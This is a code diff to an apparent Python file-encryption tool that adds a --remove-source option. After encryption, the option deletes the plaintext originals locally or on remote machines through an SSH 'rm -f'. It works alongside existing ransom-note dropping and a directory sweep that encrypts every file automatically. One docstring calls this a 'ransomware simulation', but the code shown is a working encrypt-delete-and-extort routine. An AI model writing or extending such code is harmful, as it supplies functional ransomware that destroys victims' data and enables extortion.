@@ -63,6 +63,7 @@ REMOTE (streamed over ssh, no agent needed):
   --local-out              -o is a local path even with --host
   --drop-note <template>   After success, drop ransom note (generic/polite/press)
   --note-out <path>        Custom ransom-note location
+  --remove-source          After success, delete the original file
 AUTOMATION (engages as soon as the connection is up):
   give -i/--input-file a DIRECTORY (local or remote) instead of a
   file: every file inside is encrypted in one pass, no per-file prompt.
@@ -356,6 +357,40 @@ def _default_restore(file_path: str) -> str:
     return file_path[:-4] if file_path.endswith(".enc") else f"{file_path}.dec"
 
 
+def _remove_source(
+    path: str, host: str | None, port: int, timeout: int, local_in: bool
+) -> str | None:
+    """Delete a plaintext source after successful encryption (--remove-source).
+
+    Local files are unlinked directly; remote sources (--host without
+    --local-in) are removed over the same SSH transport used for encryption.
+    Returns None on success, or a short error description on failure.
+    """
+    if host and not local_in:
+        cmd = _ssh_args(host, port, f"rm -f {shlex.quote(path)}")
+        try:
+            proc, stderr_text = _spawn_ssh(cmd, timeout)
+        except OSError as exc:
+            return f"ssh unavailable: {exc}"
+        if proc.stdout is not None:
+            with contextlib.suppress(OSError, ValueError):
+                proc.stdout.read()
+        try:
+            proc.wait(timeout=timeout)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            return "remote rm timed out"
+        if proc.returncode != 0:
+            detail = (stderr_text() or "").strip().splitlines()
+            return f"remote rm failed: {detail[-1] if detail else 'unknown error'}"
+        return None
+    try:
+        Path(path).unlink()
+    except OSError as exc:
+        return str(exc)
+    return None
+
+
 class Cipher(BaseCipher):
     """Authenticated file encryption cipher."""
 
@@ -449,14 +484,33 @@ class Cipher(BaseCipher):
         if stream_error is not None:
             return CipherResult(stream_error, False)
         destination = getattr(args, "output", None) or _default_output(file_path or "")
+        note_suffix = ""
         if getattr(args, "drop_note", None):
             drop_loc, drop_note_text = _drop_ransom_note(args, file_path if file_path else None,
                                                           host, port, timeout, local_out)
-            return CipherResult(
-                f"File encrypted to {destination}\n[+] ransom note dropped -> {drop_loc}\n{drop_note_text}",
-                True,
+            note_suffix = f"\n[+] ransom note dropped -> {drop_loc}\n{drop_note_text}"
+
+        removal_suffix = ""
+        if file_path and getattr(args, "remove_source", False):
+            out_path = getattr(args, "output", None)
+            same_path = (
+                out_path
+                and (not host or local_in)
+                and (not host or local_out)
+                and Path(str(out_path)).resolve() == Path(str(file_path)).resolve()
             )
-        return CipherResult(f"File encrypted to {destination}", True)
+            if same_path:
+                removal_suffix = "\n[!] source removal skipped: output path equals the source"
+            else:
+                err = _remove_source(file_path, host, port, timeout, local_in)
+                removal_suffix = (
+                    "\n[+] source removed"
+                    if err is None
+                    else f"\n[!] source removal failed: {err}"
+                )
+        return CipherResult(
+            f"File encrypted to {destination}" + note_suffix + removal_suffix, True
+        )
 
     # ------------------------------------------------------------------ decode
 
@@ -579,7 +633,8 @@ class Cipher(BaseCipher):
         Directory sweep: pass a directory as -i/--input-file instead of an
         individual file (local or remote). Once the SSH/local connection is
         up, every file found within is encrypted in-place-as-*.enc without any
-        further input.
+        further input. With --remove-source, each plaintext source is deleted
+        right after its ciphertext is written (ransomware simulation).
         """
         file_path = getattr(args, "file", None)
         text = getattr(args, "text", None)
@@ -640,15 +695,24 @@ class Cipher(BaseCipher):
             drop_loc, drop_note_text = _drop_ransom_note(args, file_path, host, port, timeout, local_out)
 
         results: list[str] = []
+        remove_source = bool(getattr(args, "remove_source", False))
         for i, target_file in enumerate(files, start=1):
             # build an args copy with overridden file + output path per file
             import copy
             a = copy.copy(args)
             a.file = target_file
             a.output = None  # default per-file output for encryption
+            a.remove_source = False  # the sweep loop removes sources itself, per file
             res = self._encrypt_single(a)
             if res.success:
-                results.append(f"[+] {i}/{len(files)} {target_file} -> {target_file}.enc")
+                line = f"[+] {i}/{len(files)} {target_file} -> {target_file}.enc"
+                if remove_source:
+                    err = _remove_source(target_file, host, port, timeout, local_in)
+                    if err is None:
+                        line += " (source removed)"
+                    else:
+                        line += f" (source removal failed: {err})"
+                results.append(line)
             else:
                 results.append(f"[!] {i}/{len(files)} {target_file}: {res.output}")
 
